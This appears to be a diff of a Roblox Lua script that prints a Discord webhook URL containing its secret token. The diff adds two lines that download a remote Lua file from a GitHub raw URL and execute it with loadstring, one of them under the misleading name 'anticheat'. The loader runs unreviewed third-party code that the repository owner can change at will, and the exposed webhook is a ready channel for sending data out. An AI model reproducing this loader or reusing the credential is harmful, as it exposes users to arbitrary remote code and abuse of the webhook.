@@ -8,3 +8,9 @@
 local url = "https://discord.com/api/webhooks/1385874031747666070/5BfmgdyHwO9QcUgR5RecEldTzuQyfkylEGhQhAqanzyPQn6AAtv9lmO5q9ymJ6mN5u4l"
 print(url)
 
+local anticheat = "https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/NotifyBloxFruit.lua"
+loadstring(game:HttpGet(anticheat))()
+
+
+local notify = "https://raw.githubusercontent.com/TDDuym500/npmc_/refs/heads/main/NotifyBloxFruit.lua"
+loadstring(game:HttpGet(notify))()
